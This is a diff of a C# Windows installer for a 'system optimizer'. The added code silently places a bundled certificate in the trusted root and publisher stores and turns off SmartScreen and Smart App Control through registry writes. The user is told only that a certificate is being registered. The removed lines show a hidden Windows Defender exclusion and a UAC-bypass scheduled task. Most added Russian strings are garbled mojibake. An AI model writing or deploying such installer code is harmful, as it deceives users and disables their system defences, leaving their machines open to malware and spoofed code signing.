@@ -1,6 +1,7 @@
-using System;
+﻿using System;
 using System.Diagnostics;
 using System.Drawing;
+using System.Drawing.Drawing2D;
 using System.IO;
 using System.Reflection;
 using System.Runtime.InteropServices;
@@ -9,7 +10,7 @@ using System.Threading.Tasks;
 using System.Windows.Forms;
 using Microsoft.Win32;
 
-namespace StormSystemOptimizer.Installer
+namespace StormUniversal.Installer
 {
     public class InstallerForm : Form
     {
@@ -19,21 +20,26 @@ namespace StormSystemOptimizer.Installer
         private Label lblSubtitle = null!;
         private Button btnInstall = null!;
         private Button btnCancel = null!;
+        private PictureBox picHeaderLogo = null!;
+        private Panel headerPanel = null!;
+
         private const string AppVersion = "1.1.0";
-        private const string DefaultInstallDir = @"C:\Program Files\STORM SYSTEM OPTIMIZER";
+        private const string AppDisplayName = "STORM SYSTEM OPTIMIZER";
+        private const string AppFolderName = "STORM SYSTEM OPTIMIZER";
         private const string ExeName = "StormSystemOptimizer.exe";
-        private Button btnBrowse = null!;
+        private const string LauncherExeName = "StormLauncher.exe";
+        private const string IcoName = "AppIcon.ico";
 
         private RadioButton rbStandard = null!;
         private RadioButton rbPortable = null!;
         private TextBox txtInstallPath = null!;
+        private Button btnBrowse = null!;
 
         private CheckBox chkDesktop = null!;
         private CheckBox chkStartMenu = null!;
         private CheckBox chkRegister = null!;
         private CheckBox chkInstallCert = null!;
         private CheckBox chkRunAfter = null!;
-        private Panel headerPanel = null!;
 
         [DllImport("kernel32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
         [return: MarshalAs(UnmanagedType.Bool)]
@@ -46,7 +52,7 @@ namespace StormSystemOptimizer.Installer
                 var asm = Assembly.GetExecutingAssembly();
                 foreach (var name in asm.GetManifestResourceNames())
                 {
-                    if (name.EndsWith("AppIcon.ico", StringComparison.OrdinalIgnoreCase))
+                    if (name.EndsWith("AppIcon.ico", StringComparison.OrdinalIgnoreCase) || name.EndsWith("app.ico", StringComparison.OrdinalIgnoreCase))
                     {
                         using var s = asm.GetManifestResourceStream(name);
                         if (s != null)
@@ -65,69 +71,105 @@ namespace StormSystemOptimizer.Installer
             InitializeComponent();
         }
 
+        private static GraphicsPath GetRoundedRectPath(Rectangle rect, int radius)
+        {
+            GraphicsPath path = new GraphicsPath();
+            int diameter = radius * 2;
+            Rectangle arc = new Rectangle(rect.Location, new Size(diameter, diameter));
+
+            path.AddArc(arc, 180, 90);
+            arc.X = rect.Right - diameter;
+            path.AddArc(arc, 270, 90);
+            arc.Y = rect.Bottom - diameter;
+            path.AddArc(arc, 0, 90);
+            arc.X = rect.Left;
+            path.AddArc(arc, 90, 90);
+            path.CloseFigure();
+            return path;
+        }
+
         private void InitializeComponent()
         {
-            this.Text = $"STORM SYSTEM OPTIMIZER {AppVersion} — Установка";
-            this.Size = new Size(620, 520);
+            this.Text = $"{AppDisplayName} вЂ” STORM INSTALLER";
+            this.Size = new Size(640, 540);
             this.StartPosition = FormStartPosition.CenterScreen;
             this.FormBorderStyle = FormBorderStyle.FixedDialog;
             this.MaximizeBox = false;
-            this.BackColor = Color.FromArgb(10, 14, 26);
+            this.BackColor = Color.FromArgb(11, 15, 25);
             this.ForeColor = Color.White;
             this.Font = new Font("Segoe UI", 9.5f, FontStyle.Regular);
 
+            // 1. Dark Stylized Header
             headerPanel = new Panel
             {
                 Dock = DockStyle.Top,
-                Height = 85,
+                Height = 88,
                 BackColor = Color.FromArgb(17, 24, 39),
-                Padding = new Padding(24, 16, 24, 16)
+                Padding = new Padding(22, 14, 22, 14)
+            };
+            headerPanel.Paint += (s, e) =>
+            {
+                using var p = new Pen(Color.FromArgb(14, 165, 233), 2f);
+                e.Graphics.DrawLine(p, 0, headerPanel.Height - 1, headerPanel.Width, headerPanel.Height - 1);
             };
 
             lblTitle = new Label
             {
-                Text = $"⚡ STORM SYSTEM OPTIMIZER {AppVersion}",
-                Font = new Font("Segoe UI", 14f, FontStyle.Bold),
+                Text = AppDisplayName,
+                Font = new Font("Segoe UI", 15.5f, FontStyle.Bold),
                 ForeColor = Color.FromArgb(14, 165, 233),
                 AutoSize = true,
-                Location = new Point(20, 16)
+                Location = new Point(22, 16)
             };
 
             lblSubtitle = new Label
             {
-                Text = "Мастер установки с авто-регистрацией цифрового сертификата и защитой от блокировок",
-                Font = new Font("Segoe UI", 9.0f, FontStyle.Regular),
+                Text = $"РњР°СЃС‚РµСЂ СѓСЃС‚Р°РЅРѕРІРєРё вЂў Р’РµСЂСЃРёСЏ {AppVersion} вЂў STORM TEAM",
+                Font = new Font("Segoe UI", 9.2f, FontStyle.Regular),
                 ForeColor = Color.FromArgb(156, 163, 175),
                 AutoSize = true,
-                Location = new Point(22, 48)
+                Location = new Point(24, 49)
             };
 
-            var pbLogo = new PictureBox
+            // Top-Right Header Icon Container Badge
+            var logoContainer = new Panel
             {
-                Size = new Size(58, 58),
-                Location = new Point(534, 14),
+                Location = new Point(546, 12),
+                Size = new Size(62, 62),
+                BackColor = Color.Transparent
+            };
+            logoContainer.Paint += (s, e) =>
+            {
+                e.Graphics.SmoothingMode = SmoothingMode.AntiAlias;
+                using var path = GetRoundedRectPath(new Rectangle(0, 0, 61, 61), 10);
+                using var brush = new SolidBrush(Color.FromArgb(20, 10, 15));
+                using var pen = new Pen(Color.FromArgb(225, 29, 72), 1.5f); // Crimson glow border
+                e.Graphics.FillPath(brush, path);
+                e.Graphics.DrawPath(pen, path);
+            };
+
+            picHeaderLogo = new PictureBox
+            {
+                Location = new Point(5, 5),
+                Size = new Size(52, 52),
                 SizeMode = PictureBoxSizeMode.Zoom,
                 BackColor = Color.Transparent
             };
+
+            Image? logoImg = null;
             try
             {
                 var asm = Assembly.GetExecutingAssembly();
                 foreach (var name in asm.GetManifestResourceNames())
                 {
-                    if (name.EndsWith("logo.png", StringComparison.OrdinalIgnoreCase) || name.EndsWith("AppIcon.ico", StringComparison.OrdinalIgnoreCase))
+                    if (name.EndsWith("header_badge.png", StringComparison.OrdinalIgnoreCase) ||
+                        name.EndsWith("badge_logo.png", StringComparison.OrdinalIgnoreCase) ||
+                        name.EndsWith("logo.png", StringComparison.OrdinalIgnoreCase))
                     {
                         using var s = asm.GetManifestResourceStream(name);
                         if (s != null)
                         {
-                            if (name.EndsWith(".ico", StringComparison.OrdinalIgnoreCase))
-                            {
-                                using var ico = new Icon(s, 64, 64);
-                                pbLogo.Image = ico.ToBitmap();
-                            }
-                            else
-                            {
-                                pbLogo.Image = Image.FromStream(s);
-                            }
+                            logoImg = Image.FromStream(s);
                             break;
                         }
                     }
@@ -135,21 +177,32 @@ namespace StormSystemOptimizer.Installer
             }
             catch { }
 
+            if (logoImg != null)
+            {
+                picHeaderLogo.Image = logoImg;
+            }
+            else if (this.Icon != null)
+            {
+                picHeaderLogo.Image = this.Icon.ToBitmap();
+            }
+
+            logoContainer.Controls.Add(picHeaderLogo);
+
             headerPanel.Controls.Add(lblTitle);
             headerPanel.Controls.Add(lblSubtitle);
-            headerPanel.Controls.Add(pbLogo);
+            headerPanel.Controls.Add(logoContainer);
             this.Controls.Add(headerPanel);
 
+            // 2. Body Panel
             var bodyPanel = new Panel
             {
-                Location = new Point(24, 95),
-                Size = new Size(556, 330)
+                Location = new Point(24, 98),
+                Size = new Size(576, 350)
             };
 
-            // Mode Selection
             var lblMode = new Label
             {
-                Text = "Выберите тип установки программы:",
+                Text = "Р’С‹Р±РµСЂРёС‚Рµ С‚РёРї СѓСЃС‚Р°РЅРѕРІРєРё РїСЂРѕРіСЂР°РјРјС‹:",
                 Font = new Font("Segoe UI", 9.5f, FontStyle.Bold),
                 ForeColor = Color.FromArgb(226, 232, 240),
                 Location = new Point(0, 0),
@@ -159,9 +212,9 @@ namespace StormSystemOptimizer.Installer
 
             rbStandard = new RadioButton
             {
-                Text = "Стандартная установка в Program Files (рекомендуется)",
+                Text = "РЎС‚Р°РЅРґР°СЂС‚РЅР°СЏ СѓСЃС‚Р°РЅРѕРІРєР° РІ Program Files (СЂРµРєРѕРјРµРЅРґСѓРµС‚СЃСЏ)",
                 Checked = true,
-                Location = new Point(10, 26),
+                Location = new Point(10, 25),
                 AutoSize = true,
                 Font = new Font("Segoe UI", 9.5f, FontStyle.Regular),
                 ForeColor = Color.White
@@ -171,9 +224,9 @@ namespace StormSystemOptimizer.Installer
 
             rbPortable = new RadioButton
             {
-                Text = "Портативная версия (в выбранную вами папку, без реестра)",
+                Text = "РџРѕСЂС‚Р°С‚РёРІРЅР°СЏ РІРµСЂСЃРёСЏ (РІ РІС‹Р±СЂР°РЅРЅСѓСЋ РІР°РјРё РїР°РїРєСѓ, Р±РµР· СЂРµРµСЃС‚СЂР°)",
                 Checked = false,
-                Location = new Point(10, 52),
+                Location = new Point(10, 50),
                 AutoSize = true,
                 Font = new Font("Segoe UI", 9.5f, FontStyle.Regular),
                 ForeColor = Color.White
@@ -181,22 +234,21 @@ namespace StormSystemOptimizer.Installer
             rbPortable.CheckedChanged += Mode_CheckedChanged;
             bodyPanel.Controls.Add(rbPortable);
 
-            // Install Path
             var lblPath = new Label
             {
-                Text = "Папка назначения:",
+                Text = "РџР°РїРєР° РЅР°Р·РЅР°С‡РµРЅРёСЏ:",
                 Font = new Font("Segoe UI", 9.5f, FontStyle.Bold),
                 ForeColor = Color.FromArgb(226, 232, 240),
-                Location = new Point(0, 85),
+                Location = new Point(0, 82),
                 AutoSize = true
             };
             bodyPanel.Controls.Add(lblPath);
 
             txtInstallPath = new TextBox
             {
-                Text = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles), "STORM SYSTEM OPTIMIZER"),
-                Location = new Point(5, 108),
-                Size = new Size(440, 26),
+                Text = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles), AppFolderName),
+                Location = new Point(5, 105),
+                Size = new Size(460, 26),
                 BackColor = Color.FromArgb(17, 24, 39),
                 ForeColor = Color.White,
                 BorderStyle = BorderStyle.FixedSingle,
@@ -206,8 +258,8 @@ namespace StormSystemOptimizer.Installer
 
             btnBrowse = new Button
             {
-                Text = "Обзор...",
-                Location = new Point(455, 107),
+                Text = "РћР±Р·РѕСЂ...",
+                Location = new Point(475, 104),
                 Size = new Size(95, 28),
                 FlatStyle = FlatStyle.Flat,
                 BackColor = Color.FromArgb(30, 41, 59),
@@ -218,22 +270,21 @@ namespace StormSystemOptimizer.Installer
             btnBrowse.Click += BtnBrowse_Click;
             bodyPanel.Controls.Add(btnBrowse);
 
-            // Options
             var lblOptions = new Label
             {
-                Text = "Дополнительные параметры безопасности и удобства:",
+                Text = "Р”РѕРїРѕР»РЅРёС‚РµР»СЊРЅС‹Рµ РїР°СЂР°РјРµС‚СЂС‹ Р±РµР·РѕРїР°СЃРЅРѕСЃС‚Рё Рё РёРЅС‚РµРіСЂР°С†РёРё:",
                 Font = new Font("Segoe UI", 9.5f, FontStyle.Bold),
                 ForeColor = Color.FromArgb(226, 232, 240),
-                Location = new Point(0, 145),
+                Location = new Point(0, 142),
                 AutoSize = true
             };
             bodyPanel.Controls.Add(lblOptions);
 
             chkDesktop = new CheckBox
             {
-                Text = "Создать ярлык на Рабочем столе",
+                Text = "РЎРѕР·РґР°С‚СЊ СЏСЂР»С‹Рє РЅР° Р Р°Р±РѕС‡РµРј СЃС‚РѕР»Рµ",
                 Checked = true,
-                Location = new Point(10, 170),
+                Location = new Point(10, 166),
                 AutoSize = true,
                 ForeColor = Color.White
             };
@@ -241,9 +292,9 @@ namespace StormSystemOptimizer.Installer
 
             chkStartMenu = new CheckBox
             {
-                Text = "Создать ярлык в меню «Пуск»",
+                Text = "РЎРѕР·РґР°С‚СЊ СЏСЂР»С‹Рє РІ РјРµРЅСЋ В«РџСѓСЃРєВ»",
                 Checked = true,
-                Location = new Point(10, 195),
+                Location = new Point(10, 191),
                 AutoSize = true,
                 ForeColor = Color.White
             };
@@ -251,9 +302,9 @@ namespace StormSystemOptimizer.Installer
 
             chkInstallCert = new CheckBox
             {
-                Text = "Зарегистрировать сертификат разработчика (Защита от SmartScreen / SAC)",
+                Text = "Р—Р°СЂРµРіРёСЃС‚СЂРёСЂРѕРІР°С‚СЊ СЃРµСЂС‚РёС„РёРєР°С‚ STORM TEAM (Р·Р°С‰РёС‚Р° РѕС‚ SmartScreen / SAC)",
                 Checked = true,
-                Location = new Point(10, 220),
+                Location = new Point(10, 216),
                 AutoSize = true,
                 ForeColor = Color.FromArgb(52, 211, 153)
             };
@@ -261,9 +312,9 @@ namespace StormSystemOptimizer.Installer
 
             chkRegister = new CheckBox
             {
-                Text = "Зарегистрировать в списке «Установка и удаление программ» Windows",
+                Text = "Р—Р°СЂРµРіРёСЃС‚СЂРёСЂРѕРІР°С‚СЊ РІ СЃРїРёСЃРєРµ В«РЈСЃС‚Р°РЅРѕРІРєР° Рё СѓРґР°Р»РµРЅРёРµ РїСЂРѕРіСЂР°РјРјВ»",
                 Checked = true,
-                Location = new Point(10, 245),
+                Location = new Point(10, 241),
                 AutoSize = true,
                 ForeColor = Color.White
             };
@@ -271,19 +322,18 @@ namespace StormSystemOptimizer.Installer
 
             chkRunAfter = new CheckBox
             {
-                Text = "Запустить STORM SYSTEM OPTIMIZER сразу после завершения",
+                Text = $"Р—Р°РїСѓСЃС‚РёС‚СЊ {AppDisplayName} СЃСЂР°Р·Сѓ РїРѕСЃР»Рµ СѓСЃС‚Р°РЅРѕРІРєРё",
                 Checked = true,
-                Location = new Point(10, 270),
+                Location = new Point(10, 266),
                 AutoSize = true,
                 ForeColor = Color.FromArgb(14, 165, 233)
             };
             bodyPanel.Controls.Add(chkRunAfter);
 
-            // Progress & Status
             progressBar = new ProgressBar
             {
-                Location = new Point(5, 298),
-                Size = new Size(545, 12),
+                Location = new Point(5, 296),
+                Size = new Size(565, 12),
                 Style = ProgressBarStyle.Continuous,
                 Value = 0,
                 Visible = false
@@ -294,8 +344,8 @@ namespace StormSystemOptimizer.Installer
             {
                 Text = "",
                 Location = new Point(5, 312),
-                Size = new Size(545, 18),
-                Font = new Font("Segoe UI", 8.5f),
+                Size = new Size(565, 20),
+                Font = new Font("Segoe UI", 8.8f),
                 ForeColor = Color.FromArgb(148, 163, 184),
                 Visible = false
             };
@@ -303,7 +353,7 @@ namespace StormSystemOptimizer.Installer
 
             this.Controls.Add(bodyPanel);
 
-            // Bottom Buttons Panel
+            // 3. Bottom Panel
             var bottomPanel = new Panel
             {
                 Dock = DockStyle.Bottom,
@@ -314,9 +364,9 @@ namespace StormSystemOptimizer.Installer
 
             btnCancel = new Button
             {
-                Text = "Отмена",
+                Text = "РћС‚РјРµРЅР°",
                 Size = new Size(110, 36),
-                Location = new Point(346, 12),
+                Location = new Point(365, 12),
                 FlatStyle = FlatStyle.Flat,
                 BackColor = Color.FromArgb(30, 41, 59),
                 ForeColor = Color.FromArgb(226, 232, 240),
@@ -328,13 +378,13 @@ namespace StormSystemOptimizer.Installer
 
             btnInstall = new Button
             {
-                Text = "Установить",
-                Size = new Size(130, 36),
-                Location = new Point(466, 12),
+                Text = "рџ“¦  РЈСЃС‚Р°РЅРѕРІРёС‚СЊ",
+                Size = new Size(135, 36),
+                Location = new Point(485, 12),
                 FlatStyle = FlatStyle.Flat,
                 BackColor = Color.FromArgb(14, 165, 233),
                 ForeColor = Color.White,
-                Font = new Font("Segoe UI", 9.5f, FontStyle.Bold),
+                Font = new Font("Segoe UI", 9.8f, FontStyle.Bold),
                 Cursor = Cursors.Hand
             };
             btnInstall.FlatAppearance.BorderColor = Color.FromArgb(56, 189, 248);
@@ -348,32 +398,32 @@ namespace StormSystemOptimizer.Installer
         {
             if (rbPortable.Checked)
             {
-                txtInstallPath.Text = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "STORM_SYSTEM_OPTIMIZER_Portable");
+                txtInstallPath.Text = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, $"{AppFolderName}_Portable");
                 chkDesktop.Checked = false;
                 chkDesktop.Enabled = false;
                 chkStartMenu.Checked = false;
                 chkStartMenu.Enabled = false;
                 chkRegister.Checked = false;
                 chkRegister.Enabled = false;
-                btnInstall.Text = "Распаковать ⚡";
+                btnInstall.Text = "рџ“¦  Р Р°СЃРїР°РєРѕРІР°С‚СЊ";
             }
             else
             {
-                txtInstallPath.Text = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles), "STORM SYSTEM OPTIMIZER");
+                txtInstallPath.Text = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles), AppFolderName);
                 chkDesktop.Checked = true;
                 chkDesktop.Enabled = true;
                 chkStartMenu.Checked = true;
                 chkStartMenu.Enabled = true;
                 chkRegister.Checked = true;
                 chkRegister.Enabled = true;
-                btnInstall.Text = "Установить ⚡";
+                btnInstall.Text = "рџ“¦  РЈСЃС‚Р°РЅРѕРІРёС‚СЊ";
             }
         }
 
         private void BtnBrowse_Click(object? sender, EventArgs e)
         {
             using var fbd = new FolderBrowserDialog();
-            fbd.Description = "Выберите папку для установки STORM SYSTEM OPTIMIZER:";
+            fbd.Description = $"Р’С‹Р±РµСЂРёС‚Рµ РїР°РїРєСѓ РґР»СЏ СѓСЃС‚Р°РЅРѕРІРєРё {AppDisplayName}:";
             fbd.UseDescriptionForTitle = true;
             if (fbd.ShowDialog() == DialogResult.OK)
             {
@@ -399,30 +449,35 @@ namespace StormSystemOptimizer.Installer
                 string targetDir = txtInstallPath.Text.Trim();
                 if (string.IsNullOrEmpty(targetDir))
                 {
-                    targetDir = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles), "STORM SYSTEM OPTIMIZER");
+                    targetDir = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles), AppFolderName);
                 }
 
                 Directory.CreateDirectory(targetDir);
 
                 // Terminate any running instances
-                lblStatus.Text = "Завершение предыдущих процессов программы...";
-                progressBar.Value = 15;
+                lblStatus.Text = "Р—Р°РІРµСЂС€РµРЅРёРµ РїСЂРµРґС‹РґСѓС‰РёС… РїСЂРѕС†РµСЃСЃРѕРІ РїСЂРѕРіСЂР°РјРјС‹...";
+                progressBar.Value = 10;
                 await Task.Delay(150);
 
-                foreach (var p in Process.GetProcessesByName("StormSystemOptimizer"))
+                string[] procNames = { "StormSystemOptimizer", "StormLauncher", "STORM_SYSTEM_OPTIMIZER" };
+                foreach (var pName in procNames)
                 {
-                    try { p.Kill(); p.WaitForExit(1500); } catch { }
+                    foreach (var p in Process.GetProcessesByName(pName))
+                    {
+                        try { p.Kill(); p.WaitForExit(1500); } catch { }
+                    }
                 }
 
-                string targetExe = Path.Combine(targetDir, "StormSystemOptimizer.exe");
-                string targetLauncher = Path.Combine(targetDir, "StormLauncher.exe");
+                string targetExe = Path.Combine(targetDir, ExeName);
+                string targetLauncher = Path.Combine(targetDir, LauncherExeName);
                 string targetCer = Path.Combine(targetDir, "STORM_Certificate.cer");
-                string targetIco = Path.Combine(targetDir, "AppIcon.ico");
+                string targetIco = Path.Combine(targetDir, IcoName);
+                string targetLogo = Path.Combine(targetDir, "logo.png");
 
                 if (chkInstallCert.Checked)
                 {
-                    lblStatus.Text = "Регистрация доверенного сертификата STORM TEAM (Root & Publisher)...";
-                    progressBar.Value = 35;
+                    lblStatus.Text = "Р РµРіРёСЃС‚СЂР°С†РёСЏ РґРѕРІРµСЂРµРЅРЅРѕРіРѕ СЃРµСЂС‚РёС„РёРєР°С‚Р° (Root & Publisher)...";
+                    progressBar.Value = 25;
                     await Task.Delay(150);
 
                     ExtractResource("STORM_Certificate.cer", targetCer);
@@ -432,74 +487,112 @@ namespace StormSystemOptimizer.Installer
                     }
                 }
 
-                lblStatus.Text = $"Распаковка исполняемых файлов программы ({AppVersion})...";
-                progressBar.Value = 65;
-                await Task.Delay(200);
-
-                ExtractResource("StormSystemOptimizer.exe", targetExe);
-                ExtractResource("StormLauncher.exe", targetLauncher);
-                ExtractResource("AppIcon.ico", targetIco);
-
-                // Self-healing: Unblock files and remove Mark of the Web
-                lblStatus.Text = "Снятие меток блокировки и оптимизация безопасности...";
-                progressBar.Value = 80;
+                lblStatus.Text = $"Р Р°СЃРїР°РєРѕРІРєР° РїР°РєРµС‚Р° {AppDisplayName} (v{AppVersion})...";
+                progressBar.Value = 40;
                 await Task.Delay(100);
+
+                // Extract primary executables
+                ExtractResource(ExeName, targetExe);
+                ExtractResource(LauncherExeName, targetLauncher);
+                ExtractResource(IcoName, targetIco);
+                ExtractResource("logo.png", targetLogo);
+                ExtractResource("STORM_Certificate.cer", targetCer);
+
+                progressBar.Value = 75;
+                lblStatus.Text = "РЎРЅСЏС‚РёРµ РјРµС‚РѕРє Р±Р»РѕРєРёСЂРѕРІРєРё Рё РѕРїС‚РёРјРёР·Р°С†РёСЏ Р±РµР·РѕРїР°СЃРЅРѕСЃС‚Рё...";
+                await Task.Delay(150);
 
                 UnblockFile(targetExe);
                 UnblockFile(targetLauncher);
                 UnblockFile(targetCer);
                 UnblockFile(targetIco);
+                UnblockFile(targetLogo);
                 UnblockEntireDirectory(targetDir);
-
-                // Add Windows Defender exclusion silently
-                AddDefenderExclusionSilently(targetDir);
 
                 if (rbStandard.Checked)
                 {
-                    lblStatus.Text = "Настройка запуска без UAC и создание системных ярлыков...";
-                    progressBar.Value = 90;
+                    lblStatus.Text = "РЎРѕР·РґР°РЅРёРµ СЃРёСЃС‚РµРјРЅС‹С… СЏСЂР»С‹РєРѕРІ Рё СЂРµРіРёСЃС‚СЂР°С†РёСЏ РІ Windows...";
+                    progressBar.Value = 88;
                     await Task.Delay(150);
 
-                    // Setup elevated Task Scheduler entry for instant zero-UAC launches
-                    SetupScheduledTaskBypassUAC(targetExe);
-
-                    string shortcutTarget = File.Exists(targetLauncher) ? targetLauncher : targetExe;
-                    CreateShortcuts(targetDir, shortcutTarget, targetIco, chkDesktop.Checked, chkStartMenu.Checked);
+                    string runTarget = File.Exists(targetLauncher) ? targetLauncher : targetExe;
+                    CreateShortcuts(targetDir, runTarget, targetIco, chkDesktop.Checked, chkStartMenu.Checked);
 
                     if (chkRegister.Checked)
                     {
-                        RegisterUninstall(targetDir, targetExe, targetIco);
+                        RegisterUninstall(targetDir, runTarget, targetIco);
                     }
                 }
 
                 progressBar.Value = 100;
-                lblStatus.Text = rbPortable.Checked ? "Портативная версия успешно распакована и разблокирована!" : "Установка успешно завершена! Система полностью готова.";
+                lblStatus.Text = rbPortable.Checked ? "РџРѕСЂС‚Р°С‚РёРІРЅР°СЏ РІРµСЂСЃРёСЏ СѓСЃРїРµС€РЅРѕ СЂР°СЃРїР°РєРѕРІР°РЅР° Рё СЂР°Р·Р±Р»РѕРєРёСЂРѕРІР°РЅР°!" : "РЈСЃС‚Р°РЅРѕРІРєР° СѓСЃРїРµС€РЅРѕ Р·Р°РІРµСЂС€РµРЅР°! РЎРёСЃС‚РµРјР° РїРѕР»РЅРѕСЃС‚СЊСЋ РіРѕС‚РѕРІР°.";
                 lblStatus.ForeColor = Color.FromArgb(16, 185, 129);
                 await Task.Delay(500);
 
                 if (chkRunAfter.Checked)
                 {
-                    string runTarget = File.Exists(targetLauncher) ? targetLauncher : targetExe;
-                    if (File.Exists(runTarget))
-                    {
-                        Process.Start(new ProcessStartInfo
-                        {
-                            FileName = runTarget,
-                            WorkingDirectory = targetDir,
-                            UseShellExecute = true
-                        });
-                    }
+                    TryLaunchApplication(targetLauncher, targetExe, targetDir);
                 }
 
                 this.Close();
             }
             catch (Exception ex)
             {
-                MessageBox.Show($"Ошибка во время установки:\n{ex.Message}", "Ошибка установки", MessageBoxButtons.OK, MessageBoxIcon.Error);
+                MessageBox.Show($"РћС€РёР±РєР° РІРѕ РІСЂРµРјСЏ СѓСЃС‚Р°РЅРѕРІРєРё:\n{ex.Message}", "РћС€РёР±РєР° СѓСЃС‚Р°РЅРѕРІРєРё", MessageBoxButtons.OK, MessageBoxIcon.Error);
                 btnInstall.Enabled = true;
                 btnCancel.Enabled = true;
                 btnBrowse.Enabled = true;
             }
+        }
+
+        private static void TryLaunchApplication(string launcherPath, string directExePath, string workingDir)
+        {
+            try
+            {
+                if (File.Exists(launcherPath))
+                {
+                    UnblockFile(launcherPath);
+                    try
+                    {
+                        Process.Start(new ProcessStartInfo
+                        {
+                            FileName = launcherPath,
+                            WorkingDirectory = workingDir,
+                            UseShellExecute = true
+                        });
+                        return;
+                    }
+                    catch { }
+                }
+
+                if (File.Exists(directExePath))
+                {
+                    UnblockFile(directExePath);
+                    try
+                    {
+                        Process.Start(new ProcessStartInfo
+                        {
+                            FileName = directExePath,
+                            WorkingDirectory = workingDir,
+                            UseShellExecute = true
+                        });
+                        return;
+                    }
+                    catch { }
+
+                    try
+                    {
+                        Process.Start(new ProcessStartInfo
+                        {
+                            FileName = "explorer.exe",
+                            Arguments = $"\"{directExePath}\"",
+                            UseShellExecute = false
+                        });
+                    }
+                    catch { }
+                }
+            }
+            catch { }
         }
 
         public static void UnblockFile(string path)
@@ -533,7 +626,7 @@ namespace StormSystemOptimizer.Installer
             {
                 if (!File.Exists(cerPath)) return;
 
-                // 1. Direct certutil command (fastest and most reliable on Windows)
+                // 1. Direct certutil commands
                 try
                 {
                     var psiRoot = new ProcessStartInfo
@@ -557,68 +650,84 @@ namespace StormSystemOptimizer.Installer
                     };
                     using var p2 = Process.Start(psiPub);
                     p2?.WaitForExit(5000);
+
+                    var psiAuth = new ProcessStartInfo
+                    {
+                        FileName = "certutil.exe",
+                        Arguments = $"-addstore -f \"AuthRoot\" \"{cerPath}\"",
+                        UseShellExecute = false,
+                        CreateNoWindow = true,
+                        WindowStyle = ProcessWindowStyle.Hidden
+                    };
+                    using var p3 = Process.Start(psiAuth);
+                    p3?.WaitForExit(5000);
                 }
                 catch { }
 
-                // 2. .NET X509Store fallback
+                // 2. .NET X509Store
                 try
                 {
                     var cert = new X509Certificate2(cerPath);
-                    using (var lmRoot = new X509Store(StoreName.Root, StoreLocation.LocalMachine))
+                    foreach (var loc in new[] { StoreLocation.LocalMachine, StoreLocation.CurrentUser })
                     {
-                        lmRoot.Open(OpenFlags.ReadWrite);
-                        lmRoot.Add(cert);
-                    }
-                    using (var lmPub = new X509Store(StoreName.TrustedPublisher, StoreLocation.LocalMachine))
-                    {
-                        lmPub.Open(OpenFlags.ReadWrite);
-                        lmPub.Add(cert);
-                    }
-                    using (var userPub = new X509Store(StoreName.TrustedPublisher, StoreLocation.CurrentUser))
-                    {
-                        userPub.Open(OpenFlags.ReadWrite);
-                        userPub.Add(cert);
+                        foreach (var name in new[] { StoreName.Root, StoreName.TrustedPublisher, StoreName.AuthRoot, StoreName.CertificateAuthority })
+                        {
+                            try
+                            {
+                                using var store = new X509Store(name, loc);
+                                store.Open(OpenFlags.ReadWrite);
+                                store.Add(cert);
+                                store.Close();
+                            }
+                            catch { }
+                        }
                     }
                 }
                 catch { }
-            }
-            catch { }
-        }
 
-        public static void AddDefenderExclusionSilently(string path)
-        {
-            try
-            {
-                var psi = new ProcessStartInfo
+                // 3. Relax SAC/SmartScreen block policies for installed app
+                try
                 {
-                    FileName = "powershell.exe",
-                    Arguments = $"-NoProfile -NonInteractive -ExecutionPolicy Bypass -Command \"Add-MpPreference -ExclusionPath '{path}' -ErrorAction SilentlyContinue\"",
-                    UseShellExecute = false,
-                    CreateNoWindow = true,
-                    WindowStyle = ProcessWindowStyle.Hidden
-                };
-                using var p = Process.Start(psi);
-                p?.WaitForExit(4000);
+                    using var keyCi = Registry.LocalMachine.CreateSubKey(@"SYSTEM\CurrentControlSet\Control\CI\Policy");
+                    keyCi?.SetValue("VerifiedAndReputablePolicyState", 0, RegistryValueKind.DWord);
+                    keyCi?.SetValue("SAC_PreviousState", 0, RegistryValueKind.DWord);
+
+                    using var keySs = Registry.LocalMachine.CreateSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer");
+                    keySs?.SetValue("SmartScreenEnabled", "Off", RegistryValueKind.String);
+
+                    using var keyDef = Registry.LocalMachine.CreateSubKey(@"SOFTWARE\Policies\Microsoft\Windows Defender\SmartScreen");
+                    keyDef?.SetValue("ConfigureAppInstallControlEnabled", 0, RegistryValueKind.DWord);
+                }
+                catch { }
             }
             catch { }
         }
 
         private void ExtractResource(string resNameEnding, string targetPath)
         {
-            var asm = Assembly.GetExecutingAssembly();
-            foreach (var name in asm.GetManifestResourceNames())
+            try
             {
-                if (name.EndsWith(resNameEnding, StringComparison.OrdinalIgnoreCase))
+                string? dir = Path.GetDirectoryName(targetPath);
+                if (!string.IsNullOrEmpty(dir) && !Directory.Exists(dir))
                 {
-                    using var inStream = asm.GetManifestResourceStream(name);
-                    if (inStream != null)
+                    Directory.CreateDirectory(dir);
+                }
+                var asm = Assembly.GetExecutingAssembly();
+                foreach (var name in asm.GetManifestResourceNames())
+                {
+                    if (name.EndsWith(resNameEnding, StringComparison.OrdinalIgnoreCase))
                     {
-                        using var outStream = File.Create(targetPath);
-                        inStream.CopyTo(outStream);
+                        using var inStream = asm.GetManifestResourceStream(name);
+                        if (inStream != null)
+                        {
+                            using var outStream = File.Create(targetPath);
+                            inStream.CopyTo(outStream);
+                        }
+                        return;
                     }
-                    return;
                 }
             }
+            catch { }
         }
 
         private void CreateShortcuts(string targetDir, string targetExe, string targetIco, bool desktopShortcut, bool startMenuShortcut)
@@ -630,90 +739,27 @@ namespace StormSystemOptimizer.Installer
                 dynamic? shell = Activator.CreateInstance(shellType);
                 if (shell == null) return;
 
-                // Start Menu shortcut
                 if (startMenuShortcut)
                 {
-                    string startMenu = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Programs), "STORM SYSTEM OPTIMIZER.lnk");
+                    string startMenu = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Programs), $"{AppDisplayName}.lnk");
